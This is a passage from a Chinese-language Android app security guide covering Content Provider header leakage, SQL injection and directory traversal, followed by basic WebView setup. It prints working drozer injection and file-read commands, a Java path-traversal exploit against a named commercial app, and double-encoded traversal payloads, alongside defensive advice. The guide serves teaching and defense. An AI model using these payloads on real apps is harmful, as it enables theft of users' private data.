<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240923170729848.png" alt="image-20240923170729848"></p>
</li>
<li>
<p>可以看到有账号密码之类的数据</p>
</li>
</ul>
<p>案例3：<a target="_blank" rel="noopener" href="https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2018-9546: Download Provider文件头信息泄露</a></p>
<p><strong>漏洞描述</strong></p>
<p>Download Provider运行app获取下载的http请求头，但理论上APP只能访问自己下载的文件的http请求头，但Download Provider没有做好权限配置，导致heads可以被任意读取。header中会保存一些敏感数据，例如cookie等。</p>
<p><strong>目标代码</strong></p>
<p>读取header的URI为：<code>content://download/mydownloads/download_id/headers</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://download/mydownloads/1493/headers&quot;</span>);</span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> res.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur != <span class="literal">null</span> &amp;&amp; cur.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(LOG_SEPARATOR);</span><br><span class="line">        sb.append(<span class="string">&quot;HEADERS FOR DOWNLOAD ID &quot;</span>).append(id).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (cur.moveToNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rowHeader</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;header&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">rowValue</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;value&quot;</span>));</span><br><span class="line">            sb.append(rowHeader).append(<span class="string">&quot;: &quot;</span>).append(rowValue).append(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        log(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">        cur.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>安全防护</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.minSdkVersion不低于<span class="number">9</span></span><br><span class="line"><span class="number">2</span>.不向外部app提供数据的私有<span class="attribute">content</span> provider显示设置exported=”false”，避免组件暴露(编译api小于<span class="number">17</span>时更应注意此点)</span><br><span class="line"><span class="number">3</span>.内部app通过<span class="attribute">content</span> provid交换数据时，设置protectionLevel=”signature”验证签名</span><br><span class="line"><span class="number">4</span>.公开的<span class="attribute">content</span> provider确保不存储敏感数据</span><br><span class="line"> </span><br><span class="line">针对权限保护绕过防御措施：</span><br><span class="line"><span class="number">1</span>.使用Context<span class="selector-class">.checkCallingPermission</span>()和Context<span class="selector-class">.enforceCallingPermission</span>()来确保调用者拥有相应的权限，防止串谋攻击(confused deputy)。</span><br><span class="line"><span class="number">2</span>.可以使用如下函数，获取应用的permission保护级别是否与系统中已定义的permission保护级别一致。如果不一致，则抛出异常。</span><br></pre></td></tr></table></figure>
<h4 id="SQL注入漏洞">SQL注入漏洞</h4>
<p><strong>原理介绍</strong></p>
<p>​        对Content Provider进行增删改查操作时，程序没有对用户的输入进行过滤，未采用参数化查询的方式，可能会导致sql注入攻击。<br>
所谓的SQL注入攻击指的是攻击者可以精心构造selection参数、projection参数以及其他有效的SQL语句组成部分，实现在未授权的情况下从Content Provider获取更多信息。应该避免使用SQLiteDatabase.rawQuery()进行查询，而应该使用编译好的参数化语句。使用预编译好的语句比如SQLiteStatement，不仅可以避免SQL注入，而且操作性能也大幅提高，因为其不用每次执行都进行解析。<br>
另外一种方式是使用query(),insert(),update(),和delete()方法，因为这些函数也提供了参数化的语句。预编译的参数化语句，问号处可以插入或者使bindString()绑定值。从而避免SQL注入攻击。</p>
<p><strong>drozer关于SQL注入的相关命令</strong></p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">检测SQL注入</span><br><span class="line"><span class="keyword">run</span> scanner.provider.injection -a 包名</span><br><span class="line"></span><br><span class="line">检测目录遍历</span><br><span class="line"><span class="keyword">run</span> scanner.provider.traversal -a 包名</span><br><span class="line"></span><br><span class="line">SQL注入</span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> 具体uri + [--projection] [selection]</span><br><span class="line">示例： <span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.DBContentProvider/Passwords/ </span></span><br><span class="line">--projection <span class="string">&quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure>
<p>案例：sieve.apk</p>
<ul>
<li>
<p>检测SQL注入<br>
<code>run scanner.provider.injection  </code>-<code>a &lt;包名&gt;</code><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240923184807857.png" alt="image-20240923184807857"></p>
</li>
<li>
<p>构造sql</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span></span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot; * from Key;--+&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>列出所有表信息|</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>列出该app表信息</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.sqltables</span> -<span class="selector-tag">a</span>  com<span class="selector-class">.mwr</span><span class="selector-class">.example</span>.sieve</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="目录遍历漏洞">目录遍历漏洞</h4>
<p><strong>原理介绍</strong></p>
<p>Android Content Provider存在文件目录遍历安全漏洞，该漏洞源于对外暴露Content Provider组件的应用，没有对Content Provider组件的访问进行权限控制和对访问的目标文件的Content Query Uri进行有效判断，攻击者利用该应用暴露的Content Provider的openFile()接口进行文件目录遍历以达到访问任意可读文件的目的</p>
<p><strong>漏洞触发的前提条件</strong></p>
<p>对外暴露的Content Provider组件实现了openFile()接口<br>
没有对所访问的目标文件Uri进行有效判断，如没有过滤限制如，“…/”可实现任意可读文件的访问的Content Query Uri</p>
<p><strong>漏洞复现</strong></p>
<p>案例：<a target="_blank" rel="noopener" href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-044407">赶集网Android客户端Content Provider组件任意文件读取漏洞</a></p>
<p><strong>漏洞分析</strong></p>
<p>赶集网客户端APP的实现中定义了一个可以访问本地文件的Content Provider组件，默认的android:exported=“true”,对应com.ganji.android.jobs.html5.LocalFileContentProvider，该Provider实现了openFile()接口，通过此接口可以访问内部存储app_webview目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过&quot;…/&quot;实现目录跨越，实现对任意私有数据的访问（当然，也可以访问任意外部存储数据，只是我们更关心私有敏感数据）。</p>
<p><strong>攻击代码</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">GJContentProviderFileOperations</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> getContentResolver().openInputStream(Uri.parse(<span class="string">&quot;content://com.ganji.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;</span>));</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> in.read(buffer);</span><br><span class="line">        <span class="keyword">while</span>(n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            out.write(buffer, <span class="number">0</span>, n);</span><br><span class="line">            n = in.read(buffer);</span><br><span class="line">            Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        debugInfo(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>案例2：sieve.apk</strong></p>
<ul>
<li>
<p>检测是否有目录遍历漏洞<br>
<code>run scanner.provider.traversal -a &lt;包名&gt;</code><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240923200141351.png" alt="image-20240923200141351"></p>
</li>
<li>
<p>读取系统文件<br>
<code>run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</code><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240923200417923.png" alt="image-20240923200417923"></p>
</li>
<li>
<p>下载系统文件<br>
<code>run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db f:/home/database.db</code><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240923200859074.png" alt="image-20240923200859074"></p>
</li>
</ul>
<p>案例3：</p>
<p><strong>目标代码</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class="line"><span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri paramUri,String paramString)</span>;</span><br><span class="line"><span class="keyword">throws</span> FileNotFoundException&#123;</span><br><span class="line">    File file=<span class="keyword">new</span> <span class="title class_">File</span>(IMAGE_DIRECTORY,paramUri.getLastPathSegment());</span><br><span class="line">    <span class="keyword">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以从目标代码中分析，这段代码使用android.net.Uri.getLastPathSegment()从paramUri中获取文件名，然后将其放置在预定义好的目录IMAGE_DIRECTORY中，如果该URL是encoded编码后的，那么将可能导致目录遍历漏洞</p>
<p>Android4.3开始，Uri.getLastPathSegment()内部实现调用Uri.getPathSegments()</p>
<p>Uri.getPathSegments首先会通过getEncoded()获取一个路径，然后以”/“为分隔符将path分成片段，最后调用decode()方法解码</p>
<p>假如我们传递encoded编码后的url给getLastPathSegment()，编码后的分隔符就变成了%2F,绕过了内部的分割规则，那么返回的就可能不是真正想要的文件了。这是API设计方面的问题，直接导致了目录遍历漏洞</p>
<p>为了避免这种情况导致的目录遍历漏洞，开发者应该在传递给getLastPathSegment()之前解码，采用调用两次getLastPathSegment()方法的方式，第一次调用是为了解码，第二次调用期望得到正确的值</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class="line">    <span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri paramUri,String paramString)</span> <span class="keyword">throws</span> FileNotFoundException&#123;</span><br><span class="line">        File file=<span class="keyword">new</span> <span class="title class_">File</span>(IMAGE_DIRECTORY,Uri.parse(paramUri.getLastPathSegment()).getLastPathSegment());</span><br><span class="line">        <span class="keyword">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">这个编码后的URL： ..%<span class="number">2F</span>..%<span class="number">2F</span>..%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml  </span><br><span class="line">第一次调用getLastPathSegment()，会返回../../../data/data/com.example.android.app/shared_prefs/Example.xml。  </span><br><span class="line">第二次调用getLastPathSegment()会返回Example.xml </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">然而攻击者可以采用一种叫做<span class="string">&quot;Double Encoding&quot;</span>的技术，使得第一次调用getLastPathSegment()后无法解码。</span><br><span class="line"> </span><br><span class="line">比如下面经过<span class="type">double</span> encoded后的string就可以绕过上面这种防御</span><br><span class="line"> </span><br><span class="line">%252E%252E%<span class="number">252F</span>%252E%252E%<span class="number">252F</span>%252E%252E%252Fdata%252Fdata%252Fcom.example.android.app%252Fshared_prefs%252FExample.xml</span><br><span class="line"> </span><br><span class="line">第一次解码后： %2E%2E%<span class="number">2F</span>%2E%2E%<span class="number">2F</span>%2E%2E%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml</span><br><span class="line"> </span><br><span class="line">第二次解码后： ../../../data/data/com.example.android.app/shared_prefs/Example.xml</span><br><span class="line">仍会导致目录遍历。所以简单的解码后再传人也是不够的，仍然需要严格校验以确保path是期望的路径</span><br></pre></td></tr></table></figure>
<p><strong>安全防护</strong></p>
<ol>
<li>将不必要导出的Content Provider设置为不导出</li>
<li>去除没有必要的openFile()接口</li>
<li>过滤限制跨域访问，对访问的目标文件的路径进行有效判断</li>
<li>设置权限来进行内部应用通过Content Provider的数据共享</li>
</ol>
<h2 id="Webview漏洞"><strong>Webview漏洞</strong></h2>
<h3 id="WebView基本使用">WebView基本使用</h3>
<h4 id="打开网页">打开网页</h4>
<p><strong>控件注册</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/Wind_webview&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>代码实现</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获得控件</span></span><br><span class="line">       <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview);</span><br><span class="line">       <span class="comment">//访问网页</span></span><br><span class="line">       webView.loadUrl(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">       <span class="comment">//系统默认会通过手机浏览器打开网页，为了能够直接通过WebView显示网页，则必须设置</span></span><br><span class="line">       webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">               <span class="comment">//使用WebView加载显示url</span></span><br><span class="line">               view.loadUrl(url);</span><br><span class="line">               <span class="comment">//返回true</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure>
<p>最后我们在配置文件中添加网络权限：</p>
<p><code>&lt;uses</code>-<code>permission android:name</code>=<code>&quot;android.permission.INTERNET&quot;` `/</code>&gt;</p>
<h4 id="远程加载、">远程加载、</h4>
<p>js调用Android</p>
<p>在本地创建一个js文件,命名attack.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span><br><span class="line"><span class="language-javascript">            test.<span class="title function_">hello</span>(<span class="string">&quot;WindXaa!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>Internet Click connect<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>开启一个http_server监听</p>
<p><code>python -m http.server 8080</code></p>
<p>编写java代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class="line"><span class="comment">//参数1：Javascript对象名</span></span><br><span class="line"><span class="comment">//参数2：Java对象名</span></span><br><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);<span class="comment">//AndroidtoJS类对象映射到js的test对象</span></span><br><span class="line"><span class="comment">//loadData(String data, String mimeType, String encoding)</span></span><br><span class="line">mWebView.loadData(<span class="string">&quot;&quot;</span>,<span class="string">&quot;text/html&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 加载JS代码</span></span><br><span class="line"><span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"><span class="comment">// mWebView.loadUrl(&quot;file:///android_asset/javascript.html&quot;);</span></span><br><span class="line">mWebView.loadUrl(<span class="string">&quot;http://ip地址填自己的/attack.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">    <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;Hello，&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="常用类使用">常用类使用</h4>
<h5 id="WebSettings"><strong>WebSettings</strong></h5>
<p>作用：对WebView进行配置和管理</p>
<p>配置步骤：</p>
<p>第一步：添加访问网络权限（AndroidManifest.xml）</p>
<p><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;</code></p>
<p>注意：从Android 9.0（API级别28）开始，默认情况下禁用明文支持，会显示 <code>ERR_CLEARTEXT_NOT_PERMITTED</code>。因此http的url均无法在webview中加载，可以在manifest中application节点添加<code>android:usesCleartextTraffic=&quot;true&quot;</code>。</p>
<p>第二步：生成一个WebView组件（有两种方式）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式1：直接在在Activity中生成</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(<span class="built_in">this</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">//方法2：在Activity的layout文件里添加webview控件：</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> (WebView) findViewById(R.id.webView1);</span><br></pre></td></tr></table></figure>
<p>第三步：进行配置-利用WebSettings子类（常见方法）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明WebSettings子类</span></span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> webView.getSettings();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//如果访问的页面中要与Javascript交互，则webview必须设置支持Javascript</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//支持插件</span></span><br><span class="line">webSettings.setPluginsEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭webview中缓存</span></span><br><span class="line">webSettings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK); </span><br><span class="line"></span><br><span class="line"><span class="comment">//设置可以访问文件</span></span><br><span class="line">webSettings.setAllowFileAccess(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>常见方法：设置WebView缓存</p>
<ul>
<li>当加载 html 页面时，WebView会在/data/data/包名目录下生成 database 与 cache 两个文件夹</li>
<li>请求的 URL记录保存在 WebViewCache.db，而 URL的内容是保存在 WebViewCache 文件夹下</li>
</ul>
<h5 id="WebViewClient类"><strong>WebViewClient类</strong></h5>
<p>作用：用来处理各种通知 &amp; 请求事件</p>
<p><strong>shouldOverrideUrlLoading()</strong></p>
<p>作用：打开网页时不调用系统浏览器， 而是在本WebView中显示；在网页上的所有加载都经过这个方法,这个函数我们可以做很多操作。</p>
<h4 id="webview与js加护">webview与js加护</h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_F97H8PAK73A38RC.png" alt="image-20220726171737615"></p>
<h5 id="Android调用JS">Android调用JS</h5>
<p>准备js文件，放到assets中</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    